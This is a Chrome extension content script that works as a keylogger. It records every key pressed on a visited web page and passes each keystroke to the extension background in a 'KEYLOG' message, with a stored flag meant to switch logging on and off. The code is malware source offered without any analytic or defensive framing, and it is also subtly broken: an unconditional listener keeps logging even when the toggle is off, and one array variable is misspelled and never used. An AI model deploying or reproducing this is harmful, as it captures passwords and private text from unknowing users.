const loggedKeys = [];

document.addEventListener('keydown', (e) => {
  loggedKeys.push(e.key);
  chrome.runtime.sendMessage({ type: 'KEYLOG', key: e.key });
});

// Initialize with stored state
chrome.storage.local.get(['keyloggerActive'], (result) => {
    if (result.keyloggerActive) startLogging();
});

// Message listener
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'TOGGLE_LOGGING') {
        request.isActive ? startLogging() : stopLogging();
    }
});

let loggedKeyse = [];

function startLogging() {
    document.addEventListener('keydown', keyHandler);
}

function stopLogging() {
    document.removeEventListener('keydown', keyHandler);
}

function keyHandler(e) {
    loggedKeys.push(e.key);
    chrome.runtime.sendMessage({type: 'KEYLOG', key: e.key});
}